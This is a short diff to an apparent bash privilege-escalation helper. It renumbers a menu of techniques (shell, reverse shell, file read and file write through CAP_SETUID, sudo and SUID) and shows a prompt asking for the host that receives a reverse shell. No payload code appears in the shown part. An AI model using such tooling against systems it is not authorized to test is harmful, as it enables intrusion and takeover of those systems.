@@ -132,25 +132,25 @@ while true; do
     echo "4) File Write (CAP_SETUID Capability)"
     echo " "
     echo "Sudo : "
-    echo "1) "
-    echo "2) "
-    echo "3) "
-    echo "4) "
+    echo "5) "
+    echo "6) "
+    echo "7) "
+    echo "8) "
     echo " "
     echo "SUID : "
-    echo "1) Shell (SUID)"
-    echo "2) Reverse Shell (SUID)"
-    echo "3) File Write (SUID)"
-    echo "4) File Read (SUID)"
+    echo "9) Shell (SUID)"
+    echo "10) Reverse Shell (SUID)"
+    echo "11) File Write (SUID)"
+    echo "12) File Read (SUID)"
     echo " "
-    echo "5) Quit"
+    echo "13) Quit"
     echo " "    
     read -p "Technique Choice : " choix
     
     echo " "
  
     case "$choix" in            
-        1) Shell (CAP_SETUID Capability)
+        1)
             echo "----- < Shell (CAP_SETUID Capability) > -----"
             echo " "
             if [ -z "$ShellCap" ]; then
@@ -176,7 +176,7 @@ while true; do
                 esac
             done               
             ;;
-        2) Reverse Shell (CAP_SETUID Capability)
+        2)
             echo "----- < Reverse Shell (CAP_SETUID Capability) > -----"
             echo " "
             read -p "Local Host for receiving the Reverse Shell : " LHOST
